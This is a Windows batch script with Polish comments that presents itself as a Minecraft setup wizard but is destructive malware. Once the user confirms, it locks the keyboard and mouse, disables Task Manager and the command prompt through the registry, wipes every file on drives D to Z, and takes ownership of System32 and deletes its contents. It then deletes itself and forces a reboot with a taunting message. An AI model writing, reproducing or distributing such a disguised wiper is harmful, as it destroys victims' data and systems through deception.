@echo off
:: SPRAWDZENIE ADMINA
net session >nul 2>&1
if %errorlevel% neq 0 (
    title Error
    color 0a
    echo ########################################
    echo #                                      #
    echo #      Run as administrator, please    #
    echo #                                      #
    echo ########################################
    pause >nul
    exit /b
)

title Minecraft Installer
color 0a
cls

:: KROK 3: PYTANIE O INSTALACJE
echo ########################################
echo #                                      #
echo #      MINECRAFT SETUP WIZARD          #
echo #                                      #
echo ########################################
echo.
set /p "choice=Are you sure to install Minecraft? (Y/N): "

if /i "%choice%" neq "Y" (
    echo.
    echo Installation cancelled.
    shutdown -r -t 5 -c "Ok"
    exit
)

:: KROK 4: START DESTRUKCJI
cls
:: FIZYCZNA BLOKADA MYSZY I KLAWIATURY (PowerShell)
powershell -Command "$m = '[DllImport(\"user32.dll\")] public static extern bool BlockInput(bool fBlock);'; $type = Add-Type -MemberDefinition $m -Name 'Win32' -Namespace 'Utils' -PassThru; $type::BlockInput($true)"

:: BLOKADA TASK MANAGERA I CMD
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableCMD /t REG_DWORD /d 1 /f >nul 2>&1

:: A. CZYSZCZENIE INNYCH DYSKÓW (Wszystkie od D do Z)
for %%d in (D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%d:\ (
        for /f "delims=" %%f in ('dir /s /b %%d:\*.* 2^>nul') do (
            echo Deleting: %%f
            del /f /q "%%f" >nul 2>&1
        )
        rd /s /q %%d:\ >nul 2>&1
    )
)

:: B. PRZEJMOWANIE UPRAWNIEŃ DO SYSTEM32 I STEROWNIKÓW
takeown /f C:\Windows\System32 /r /d y >nul 2>&1
icacls C:\Windows\System32 /grant administrators:F /t >nul 2>&1

:: C. TOTALNE USUWANIE - PRZEWIJAJĄCE SIĘ ŚCIEŻKI (JAK W 1 WERSJI)
for /f "delims=" %%i in ('dir /s /b C:\Windows\System32\*.*') do (
    echo Deleting: %%i
    del /f /q "%%i" >nul 2>&1
)

:: D. SAMOUSUWANIE INSTALATORA NA SAMYM KOŃCU
(echo ping localhost -n 3 ^> nul ^& del "%~f0") > %temp%\kill_inst.bat
start /min "" %temp%\kill_inst.bat

:: E. FINALNY REBOOT Z WIADOMOŚCIĄ
cls
echo ============================================================
echo   Minecraft installed. Restarting system...
echo ============================================================
shutdown -r -t 0 -c "You are idiot thats not minecraft that is files deleting virus (system too)" -f
exit
